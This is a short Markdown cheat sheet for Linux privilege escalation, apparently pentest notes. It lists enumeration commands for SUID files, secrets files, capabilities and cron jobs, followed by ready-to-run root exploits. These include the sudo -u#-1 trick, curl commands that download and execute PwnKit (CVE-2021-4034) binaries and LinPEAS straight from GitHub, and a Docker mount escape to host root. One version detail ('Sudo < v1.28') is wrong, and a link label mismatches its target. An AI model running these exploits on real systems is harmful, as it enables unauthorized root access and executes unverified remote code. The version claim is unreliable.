# Linux Privilege Escalation

## System Enumeration

### [LinPEAS](https://github.com/peass-ng/PEASS-ng)

```bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Find SUID and GUID files

### SUID

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

### GUID

```bash
find / -type f -perm -2000 -ls 2>/dev/null
```

### Enviroment Variables

```bash
env || set
```

### Common Config Files

{% hint style="info" %}
If you want to black list any directory you can add: `-not -path "<PATH>/*"`
{% endhint %}

```bash
find / -type f -name ".env" 2>/dev/null

find / -type f -name "*conf*.php" 2>/dev/null
```

### Check Capabilities

```bash
getcap -r / 2>/dev/null
```

### Open Ports

```bash
ss -nltp
```

### Cron Jobs

```bash
# Cron files
find / -name "cron*" 2>/dev/null

# Logs
ls -l /var/log/syslog
ls -l /var/log/cron
```

### Process Monitor

{% hint style="info" %}
You can add words to the blacklist on the `grep -Ev` section.
{% endhint %}

```bash
old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); \
diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" | \
grep -Ev "kworker|user,command"; old_ps=$new_ps; done
```

### Writable Scripts

```bash
find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/null
```

## Exploits

### Sudo

Check sudo version

```bash
sudo -V | grep "Sudo ver"
```

Sudo < v1.28

```bash
sudo -u#-1 /bin/bash
```

### PwnKit - (CVE-2021-4034)

[https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)

```bash
curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py \
-o PwnKit.py && python3 PwnKit.py
```

[https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)

```bash
curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \
-o PwnKit && chmod +x PwnKit && ./PwnKit
```

### Docker

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```
